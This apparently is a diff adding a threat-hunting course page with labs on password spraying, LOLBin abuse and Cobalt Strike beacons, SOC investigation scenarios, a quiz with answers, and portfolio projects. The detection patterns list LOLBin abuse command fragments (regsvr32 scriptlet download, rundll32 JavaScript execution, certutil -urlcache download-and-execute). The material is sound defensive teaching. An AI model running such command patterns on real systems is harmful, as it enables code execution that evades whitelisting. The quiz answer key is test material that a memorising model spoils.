+    <h3><i class="bi bi-laptop"></i> HANDS-ON LABS</h3>
+
+    <div class="lab-section">
+      <h4 class="text-success">Beginner Lab: Hunt for Password Spray Attacks</h4>
+      <p><strong>Objective:</strong> Hunt for a password spray attack against your organization's VPN or O365 authentication systems. Identify the attacker IP, targeted accounts, and any successful compromises.</p>
+      <p><strong>Setup:</strong> Use Azure AD Sign-in logs (accessible via Azure portal or KQL queries) or a local SIEM with authentication logs. Sample data can be found in the Azure AD Audit Log demo tenant or via the EVTX-ATTACK-SAMPLES repository.</p>
+      <p><strong>Step-by-Step:</strong>
+        <ol>
+          <li>Formulate hypothesis: "An attacker is performing password spray attacks against our O365 tenant, targeting generic/weak usernames."</li>
+          <li>Query your SIEM for failed logins over the past 7 days: `EventID=4625 AND LogonType=3 (or 10 for interactive)`</li>
+          <li>Aggregate by source IP: count distinct usernames tried per IP.</li>
+          <li>Identify IPs that attempted more than 10 usernames within a 5-minute window. Look for IPs targeting common formats: admin, user, test, temp, seasonal patterns.</li>
+          <li>For suspicious IPs, check for any successful logon (Event ID 4624) after the spray attempt.</li>
+          <li>Cross-reference suspicious IPs against threat intelligence (VirusTotal, AbuseIPDB).</li>
+          <li>If successful matches found, escalate to incident response for credential reset and MFA enforcement.</li>
+        </ol>
+      </p>
+      <p><strong>Expected Results:</strong> Identification of password spray IPs, determination if any accounts were compromised, threat intel enrichment results.</p>
+      <p><strong>Troubleshooting:</strong> If you find no spray attempts, you may need to broaden the time range or adjust your threshold (some attackers try 1-2 passwords per account per day to avoid detection).</p>
+      <p><strong>Detection Opportunities:</strong> Create a detection rule: "More than 10 failed logins from a single IP across multiple accounts in 5 minutes." Also check for failed logins followed by unusual MFA approval — MFA fatigue might be in play.</p>
+    </div>
+
+    <div class="lab-section">
+      <h4 class="text-warning">Intermediate Lab: Living Off the Land Hunt (LOLBins)</h4>
+      <p><strong>Objective:</strong> Hunt for attackers using built-in Windows binaries (LOLBins) to execute malicious code, bypassing application whitelisting and traditional AV.</p>
+      <p><strong>Setup:</strong> Deploy Sysmon with SwiftOnSecurity config on Windows endpoints. Forward Sysmon logs to a SIEM (ELK or Splunk). Generate sample LOLBin activity using Atomic Red Team (T1218 — Signed Binary Proxy Execution).</p>
+      <p><strong>Step-by-Step:</strong>
+        <ol>
+          <li>Formulate hypothesis: "Attackers are using signed Microsoft binaries (Mshta, Regsvr32, Rundll32) to execute malicious code while bypassing AppLocker."</li>
+          <li>Query Sysmon EID 1 (Process Creation) for LOLBin executions in the past 14 days: `powershell.exe, cscript.exe, wscript.exe, mshta.exe, regsvr32.exe, rundll32.exe, certutil.exe, msiexec.exe, reg.exe, wmic.exe, csc.exe`</li>
+          <li>Filter by unusual command-line patterns:
+            <ul>
+              <li>`regsvr32.exe` with network flags: `/s /u /i:<URL> scrobj.dll`</li>
+              <li>`rundll32.exe` with JavaScript: `javascript:"\..\mshtml.dll,RunHTMLApplication"`</li>
+              <li>`certutil.exe` with `-urlcache` or `-split` (download + execute)</li>
+              <li>`mshta.exe` with URL or inline JavaScript</li>
+            </ul>
+          </li>
+          <li>Review parent process: is the LOLBin being executed by Office (phishing), browser (drive-by), or a scheduled task? Unusual parent-child relationships are suspicious.</li>
+          <li>For suspicious processes, check Sysmon EID 3 (Network Connection) from the LOLBin process. Are they connecting to external IPs?</li>
+          <li>Check Sysmon EID 11 (File Creation): did the LOLBin drop files in user-writable paths (AppData, Temp, Downloads)?</li>
+          <li>Document all suspicious findings and create detection rules for identified patterns.</li>
+        </ol>
+      </p>
+      <p><strong>Expected Results:</strong> Find LOLBin executions with suspicious command lines, identify any compromised hosts, and build detection rules for future hunts.</p>
+      <p><strong>Troubleshooting:</strong> Some legitimate applications use LOLBins (e.g., certutil for certificate management). Use baseline analysis: establish normal LOLBin usage in your environment before flagging anomalies.</p>
+      <p><strong>Detection Opportunities:</strong> Create Sigma rules for each LOLBin abuse pattern. Use the LOLBAS project (lolbas-project.github.io) as a reference for known abuse techniques. Deploy hash-based blocking for known malicious LOLBin scripts via AppLocker.</p>
+    </div>
+
+    <div class="lab-section">
+      <h4 class="text-danger">Advanced Lab: Cobalt Strike Beacon Hunt</h4>
+      <p><strong>Objective:</strong> Hunt for Cobalt Strike beacon implants across the enterprise using multiple detection methods: network, endpoint, memory, and behavioral analysis.</p>
+      <p><strong>Setup:</strong> Enterprise lab with Windows 10 endpoints, Sysmon + EDR, network Zeek sensor, DNS server logging, web proxy. Simulate Cobalt Strike beacon using a C2 profile that mimics HTTPS traffic to a legitimate-looking CDN domain.</p>
+      <p><strong>Step-by-Step:</strong>
+        <ol>
+          <li>Formulate hypothesis: "An advanced attacker has deployed Cobalt Strike beacons in our environment, using HTTPS to CDN domains with JA3/JA3S fingerprinting evasion."</li>
+          <li>Stage 1 — Network Hunt:
+            <ol>
+              <li>Analyze Zeek SSL logs for JA3/JA3S signatures. Known Cobalt Strike JA3 hashes: 6734f37431670b3ab4292b8f60f29984 (default CS), 72a589da5861ee3f2470b0cb12b49c7e (CS 4.x).</li>
+              <li>Search for HTTPS connections to domains registered within the past 6 months that mimic CDNs (cloudfront, akamai, cloudflare lookalikes).</li>
+              <li>Check for beaconing: HTTP responses with specific lengths (typically 0-512 bytes for CS). POST intervals that are multiples of 60 seconds.</li>
+            </ol>
+          </li>
+          <li>Stage 2 — Endpoint Hunt:
+            <ol>
+              <li>Query Sysmon EID 1 for parent-child processes: Any process spawning cmd.exe or powershell.exe that is not the expected parent (e.g., explorer.exe spawning cmd.exe is normal; OUTLOOK.EXE spawning cmd.exe is suspicious).</li>
+              <li>Look for named pipes created by suspicious processes — Cobalt Strike uses named pipes like `\\.\pipe\msagent_*`, `\\.\pipe\status_*`.</li>
+              <li>Check for services or scheduled tasks with names mimicking legitimate services (e.g., "WindowsUpdate", "AdobeUpdate", "BrowserUpdate").</li>
+            </ol>
+          </li>
+          <li>Stage 3 — Memory Hunt:
+            <ol>
+              <li>Capture memory from suspicious hosts using FTK Imager or winpmem.</li>
+              <li>Use Volatility with `malfind` to detect injected code regions with RX permissions.</li>
+              <li>Use `netscan` to find hidden network connections not visible to the OS.</li>
+              <li>Extract and decrypt C2 configuration using `cobaltstrike_config` plugin or 1768.py.</li>
+            </ol>
+          </li>
+          <li>Document entire hunt: hypothesis, data sources, queries, findings (including false positives), detection rules created, incidents generated.</li>
+        </ol>
+      </p>
+      <p><strong>Expected Results:</strong> Identification of Cobalt Strike beacons via network anomalies, endpoint artifacts, or memory evidence. Full documentation of the hunting process for reproducibility.</p>
+      <p><strong>Troubleshooting:</strong> Cobalt Strike supports custom profiles that change JA3 hashes and traffic patterns. If known signatures don't match, use behavioral detection: look for the HTTPS beaconing pattern (periodic check-ins with specific response sizes) rather than signature-based detection alone.</p>
+      <p><strong>Detection Opportunities:</strong> Create multiple layered detections: (1) JA3 hash blacklist, (2) New domain + HTTPS beaconing pattern, (3) Named pipe creation anomalies, (4) Memory injection detection via EDR, (5) YARA rules for known CS shellcode patterns. Create a hunting playbook specifically for CS investigations.</p>
+    </div>
+  </div>
+
+  <!-- SOC SCENARIOS -->
+  <div class="section-card">
+    <h3><i class="bi bi-bullseye"></i> SOC SCENARIOS</h3>
+
+    <div class="scenario-box">
+      <h4>Scenario 1: PowerShell Obfuscated Command Hunt</h4>
+      <p><strong>What Happened:</strong> A threat hunter discovers unusual PowerShell activity during a routine hunt. A non-admin user's workstation is running PowerShell with an encoded command approximately every 6 hours. The hunt query (Sysmon EID 1 with `powershell -EncodedCommand` filter) identified 12 executions over 72 hours from the same host.</p>
+      <p><strong>How to Detect:</strong> Sysmon EID 1 with command-line filter for `-EncodedCommand`, `-EncodedCommand`, `-e`, `-enc`. PowerShell Script Block Logging (EID 4104). AMSI detection logs. Hunt query: `EventID=1 AND Image=*powershell.exe AND CommandLine=*-EncodedCommand*`</p>
+      <p><strong>How to Investigate:</strong>
+        <ol>
+          <li>Extract the encoded command. The Base64-encoded payload might be compressed: check if `-compress` or `-decompress` flags were used.</li>
+          <li>Decode the Base64 payload using PowerShell: `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("..."))` or online decoder.</li>
+          <li>Analyze the decoded script: does it download additional payloads? Does it set up persistence? Does it modify security settings (Defender exclusions)?</li>
+          <li>Check Sysmon EID 3 for network connections from powershell.exe around the execution time.</li>
+          <li>Check EDR for file modifications by powershell.exe: were any DLLs dropped? Were any registry keys modified?</li>
+          <li>Check the parent process: how was PowerShell launched? Outlook? Browser? Scheduled task?</li>
+        </ol>
+      </p>
+      <p><strong>How to Respond:</strong> Isolate the affected host. Collect a memory dump and disk image. Remove persistence mechanisms (scheduled tasks, registry Run keys). Reset the user's credentials. Block the C2 URLs/IPs on the firewall. Conduct a wider hunt for similar activity across all hosts.</p>
+      <p><strong>How to Document:</strong> Write the hunt report covering: hypothesis, methodology, data sources, findings, decoded PowerShell analysis, MITRE ATT&CK mapping (T1059.001, T1027, T1071.001), detection rules created, and recommendations for PowerShell logging improvements.</p>
+    </div>
+
+    <div class="scenario-box">
+      <h4>Scenario 2: Unusual DNS Query Patterns Hunt</h4>
+      <p><strong>What Happened:</strong> A threat hunter notices anomalous DNS queries in the DNS server logs. A single workstation is making hundreds of TXT record queries to domains with high entropy (e.g., kjsd8f7a3kjsdf.com, mznxc9q2hfdjsk.net). The TXT record responses are suspiciously large (500+ bytes). This pattern matches DNS tunneling behavior.</p>
+      <p><strong>How to Detect:</strong> DNS log analysis: count of TXT record queries per host, average TXT record response size, entropy analysis of queried domains. Hunting query in SIEM: `dns_query_type=TXT | stats count by host, domain | sort count desc`. Additional filter: `dns_response_size > 500`.</p>
+      <p><strong>How to Investigate:</strong>
+        <ol>
+          <li>Validate the DNS tunneling hypothesis: check if the TXT query frequency correlates with outbound data transfers.</li>
+          <li>Calculate domain entropy: use Python to compute Shannon entropy for each domain. DGA domains typically have entropy > 3.5 (normal English words are ~1.5-2.5).</li>
+          <li>Check the affected host: what process is making DNS queries? Use Sysmon EID 22 (DNS Query) — this gives the process ID making the query.</li>
+          <li>Correlate with network logs: is there a corresponding outbound connection that matches the DNS tunnel IP?</li>
+          <li>Check the host for other signs of compromise: unusual processes, registry changes, scheduled tasks.</li>
+          <li>Decode the tunneled data (if possible): DNS tunneling tools often use Base64 encoding with additional compression. Direct decode of TXT record responses.</li>
+        </ol>
+      </p>
+      <p><strong>How to Respond:</strong> Block the DGA domains on the DNS firewall. Isolate the affected host. Implement DNS sinkholing for high-entropy domains. Deploy a DNS security solution (e.g., Cisco Umbrella, Cloudflare Gateway). Enhance Sysmon configuration with EID 22 enabled.</p>
+      <p><strong>How to Document:</strong> Full hunt report with DNS query samples, entropy analysis, decoded tunnel data (if successful), process responsible for DNS queries, IOCs, and DNS security recommendations for the environment.</p>
+    </div>
+
+    <div class="scenario-box">
+      <h4>Scenario 3: Privilege Escalation via Kerberoasting Hunt</h4>
+      <p><strong>What Happened:</strong> A threat hunter hypothesizes that attackers may have compromised a domain user account and are attempting Kerberoasting to escalate privileges. The hunt focuses on abnormal service ticket requests from non-admin workstations.</p>
+      <p><strong>How to Detect:</strong> Windows Event ID 4769 (Kerberos Service Ticket Requested). Hunting query: Filter for event 4769 where Service Name ends in `$` (indicating a service account). Look for multiple TGS requests from a single workstation to different SPNs in a short timeframe. Also hunt for Event ID 4741-4743 (computer account changes) that may indicate service account manipulation.</p>
+      <p><strong>How to Investigate:</strong>
+        <ol>
+          <li>Extract the source workstation IP/hostname from 4769 events. Is this a server or a regular user workstation?</li>
+          <li>Count distinct service accounts (SPNs) requested by each workstation in the past 7 days. A normal workstation requests 1-2 SPNs. > 5 is suspicious.</li>
+          <li>Check if the requesting user has a reason to access these services (role-based review).</li>
+          <li>Use EDR to check for any credential dumping tools (mimikatz, rubeus) on the requesting workstation.</li>
+          <li>Check for network connections from the workstation to the Domain Controller at the time of the TGS requests.</li>
+          <li>Review the ticket encryption type: RC4 (type 23) indicates older encryption and is easier to crack offline. AES (type 18) is harder to crack.</li>
+        </ol>
+      </p>
+      <p><strong>How to Respond:</strong> If active abuse is confirmed: reset the compromised user's password. Disable unnecessary SPNs. Change service account passwords (ideally, use Group Managed Service Accounts — gMSAs — for automatic password rotation). Monitor the affected workstation for further malicious activity. Reset the krbtgt account password if the Domain Controller itself is compromised.</p>
+      <p><strong>How to Document:</strong> Hunt report with: Event 4769 analysis, source workstations, targeted SPNs, encryption types, timeline of requests, user role justification review, remediation actions. Create detection rules: "Kerberoasting: Multiple TGS Requests from Single Source" and "Kerberoasting: High Number of Failed TGS Requests (Event 4769 with Failure Code 0x20)."</p>
+    </div>
+  </div>
+
+  <!-- KNOWLEDGE CHECK -->
+  <div class="section-card">
+    <h3><i class="bi bi-question-circle"></i> KNOWLEDGE CHECK</h3>
+
+    <h4>Multiple Choice Questions</h4>
+    <ol class="mcq-list">
+      <li>Which of the following is the MOST effective type of threat hunting?
+        <br><strong>Options:</strong> A) Hash-based hunting B) IP-based hunting C) TTP-based hunting D) Domain-based hunting
+        <br><strong>Answer:</strong> C
+      </li>
+      <li>What does the Pyramid of Pain illustrate?
+        <br><strong>Options:</strong> A) Different levels of malware severity B) How difficult it is for attackers to change different types of IOCs C) The hierarchy of SOC roles D) The cost of different security tools
+        <br><strong>Answer:</strong> B
+      </li>
+      <li>Which Sysmon Event ID tracks DNS queries made by processes?
+        <br><strong>Options:</strong> A) EID 1 B) EID 3 C) EID 22 D) EID 11
+        <br><strong>Answer:</strong> C
+      </li>
+      <li>What is the primary data source for detecting Kerberoasting attacks?
+        <br><strong>Options:</strong> A) Sysmon EID 1 B) Windows Event ID 4769 C) DNS logs D) Proxy logs
+        <br><strong>Answer:</strong> B
+      </li>
+      <li>Which hunting model starts with "Assume breach" and looks for specific adversary behaviors?
+        <br><strong>Options:</strong> A) IoC-based hunting B) Hypothesis-driven hunting C) TTP-based hunting D) Intel-driven hunting
+        <br><strong>Answer:</strong> C
+      </li>
+      <li>What is the best statistical method to detect C2 beaconing in network traffic?
+        <br><strong>Options:</strong> A) Average packet size B) Standard deviation of time intervals between connections C) Total bandwidth usage D) Number of DNS queries
+        <br><strong>Answer:</strong> B
+      </li>
+      <li>Which tool allows running VQL queries across thousands of endpoints to hunt for IOCs at scale?
+        <br><strong>Options:</strong> A) Splunk B) Velociraptor C) Wireshark D) Burp Suite
+        <br><strong>Answer:</strong> B
+      </li>
+      <li>What is the key difference between threat hunting and incident response?
+        <br><strong>Options:</strong> A) Hunting is reactive, IR is proactive B) Hunting is proactive, IR is reactive C) There is no difference D) Hunting requires more tools
+        <br><strong>Answer:</strong> B
+      </li>
+      <li>What does high entropy in a domain name typically indicate?
+        <br><strong>Options:</strong> A) The domain is popular B) The domain is likely algorithmically generated (DGA) C) The domain is encrypted D) The domain is published in threat feeds
+        <br><strong>Answer:</strong> B
+      </li>
+      <li>Which PowerShell logging setting is critical for detecting obfuscated PowerShell attacks?
+        <br><strong>Options:</strong> A) Module Logging B) Script Block Logging (EID 4104) C) Transcription Logging D) Protected Event Logging
+        <br><strong>Answer:</strong> B
+      </li>
+    </ol>
+
+    <h4>Practical Questions</h4>
+    <ol>
+      <li>You need to hunt for Cobalt Strike beacons in your environment. List 5 different data sources and what you would look for in each.</li>
+      <li>Write a Sigma rule to detect `rundll32.exe` executing without command-line arguments (suspicious DLL sideloading indicator).</li>
+      <li>A user reports their computer is "acting slow." How do you determine if this is a performance issue or a compromise? What hunting steps would you take?</li>
+      <li>Explain how you would baseline "normal" PowerShell usage in your organization. What metrics would you track?</li>
+      <li>You find 500 DNS TXT record queries from a single host in one hour. How do you investigate this further?</li>
+    </ol>
+
+    <h4>Investigation Scenarios</h4>
+    <ol>
+      <li><strong>Scenario A:</strong> Your DNS log analysis tool shows that a workstation has been making DNS queries to a domain that was registered yesterday. The domain resolves to a cloud CDN IP. The queries occur at exactly 60-second intervals with exactly 512-byte responses. Investigate this finding and document your methodology.</li>
+      <li><strong>Scenario B:</strong> A Week 1 hunt finds nothing. Week 2, using the same hypothesis but different data sources, you find signs of credential dumping. How do you reconcile these results? What does this teach you about the hunting process?</li>
+    </ol>
+
+    <h4>Interview Questions</h4>
+    <ol>
+      <li>How would you build a threat hunting program from scratch in an organization that currently only does reactive incident response?</li>
+      <li>Describe the threat hunting loop and explain why it's important to close the loop with detection rule creation.</li>
+      <li>An executive asks: "Why should we invest in threat hunting when our SIEM already detects everything?" How do you respond?</li>
+    </ol>
+  </div>
+
+  <!-- PORTFOLIO PROJECTS -->
+  <div class="section-card">
+    <h3><i class="bi bi-folder"></i> PORTFOLIO PROJECTS</h3>
+
+    <div class="project-box">
+      <h4 class="text-success">Beginner: Threat Hunting Playbook Repository</h4>
+      <p><strong>Objective:</strong> Create a collection of 5 threat hunting playbooks covering different attack types. Each playbook includes hypothesis, data sources, queries, investigation steps, and detection rule recommendations.</p>
+      <p><strong>Architecture:</strong> Markdown-based repository hosted on GitHub. Each playbook follows a consistent template. Include Mermaid diagrams for the hunting workflow. Use Sigma rules (saved as .yml) alongside each playbook.</p>
+      <p><strong>Tools:</strong> GitHub, Markdown editor, Mermaid, Sigma CLI.</p>
+      <p><strong>Steps:</strong>
+        <ol>
+          <li>Create a GitHub repository. Create a playbook template in Markdown.</li>
+          <li>Write 5 playbooks: PowerShell Abuse, Lateral Movement, DNS Tunneling, Beaconing, Kerberoasting.</li>
+          <li>Each playbook includes: hypothesis statement, MITRE ATT&CK mapping, data sources needed, step-by-step hunt procedure (with sample SIEM/Sigma queries), expected findings, false positive guidance, detection rule creation recommendations.</li>
+          <li>Include Mermaid diagrams for each hunting workflow.</li>
+          <li>Write a README explaining how to use the playbooks.</li>
+        </ol>
+      </p>
+      <p><strong>Documentation:</strong> README with playbook index, setup instructions for logging requirements, contribution guidelines.</p>
+    </div>
+
+    <div class="project-box">
+      <h4 class="text-warning">Intermediate: Automated Hunting with Jupyter Notebooks</h4>
+      <p><strong>Objective:</strong> Build automated threat hunting notebooks using Python/Pandas that analyze log data and generate hunting reports.</p>
+      <p><strong>Architecture:</strong> Jupyter Notebooks connecting to a SIEM (Elasticsearch or Splunk) via API. Notebooks for different hunts: DGA detection, beaconing detection, password spray detection, anomalous process creation.</p>
+      <p><strong>Tools:</strong> Python, Pandas, Jupyter, Elasticsearch DSL or Splunk SDK, Matplotlib/Seaborn for visualization.</p>
+      <p><strong>Steps:</strong>
+        <ol>
+          <li>Set up Jupyter environment with required libraries.</li>
+          <li>Build a DGA detection notebook: pull DNS logs, compute domain entropy, flag domains with entropy > 3.5, visualize the results.</li>
+          <li>Build a beaconing detection notebook: analyze proxy/Zeek logs, compute time intervals between connections, flag periodic connections with low standard deviation.</li>
+          <li>Build a password spray detection notebook: analyze authentication logs, compute failed logins per IP per time window, flag campaigns.</li>
+          <li>Build an anomalous process creation notebook: analyze Sysmon EID 1 logs, identify unusual parent-child process relationships, flag LOLBin executions.</li>
+          <li>Each notebook outputs a visualization and a table of findings. Automate notebook execution via cron or Airflow.</li>
+        </ol>
+      </p>
+      <p><strong>Documentation:</strong> Explain each notebook's hypothesis, data requirements, methodology, and how to interpret results. Include sample outputs.</p>
+    </div>
+
+    <div class="project-box">
+      <h4 class="text-danger">Advanced: Detection-as-Code Pipeline with CI/CD</h4>
+      <p><strong>Objective:</strong> Build a full Detection-as-Code pipeline where Sigma rules are version-controlled, tested with Atomic Red Team, and automatically deployed to a SIEM.</p>
+      <p><strong>Architecture:</strong> GitHub Repository (Sigma rules + Atomic tests) -> GitHub Actions (validate rules, run atomic tests against test environment, convert Sigma to SIEM queries) -> SIEM API (deploy rules to production after approval).</p>
+      <p><strong>Tools:</strong> GitHub, Sigma CLI, Atomic Red Team, Elasticsearch API or Splunk SDK, Python, Docker, pySigma, pytest.</p>
+      <p><strong>Steps:</strong>
+        <ol>
+          <li>Create a GitHub repository with Sigma rules organized by MITRE ATT&CK technique.</li>
+          <li>Set up a test environment: Docker containers with Elasticsearch + Logstash (generate test events).</li>
+          <li>Write GitHub Actions workflow: on pull request, validate Sigma rule syntax, convert to Elastic rule format.</li>
+          <li>Run Atomic Red Team tests corresponding to each Sigma rule in the test environment.</li>
+          <li>Verify the SIEM rule triggers on the Atomic test. If it doesn't, flag for review.</li>
+          <li>On merge to main branch, deploy rules to production SIEM via API (with manual approval gate).</li>
+          <li>Add weekly scheduled workflow that runs all Atomic tests and reports detection coverage score.</li>
+        </ol>
+      </p>
+      <p><strong>Documentation:</strong> Architecture diagram, CI/CD pipeline configuration, rule writing guidelines, test coverage report template, deployment approval process.</p>
+    </div>
+  </div>
+
+  <!-- TOPIC NAVIGATION -->
+  <div class="d-flex justify-content-between mt-4">
+    <a href="/topics/topic9" class="btn btn-outline-cyan"><i class="bi bi-arrow-left"></i> Previous: Incident Response</a>
+    <a href="/topics/topic11" class="btn btn-cyan">Next: Digital Forensics <i class="bi bi-arrow-right"></i></a>
+  </div>
 </div>
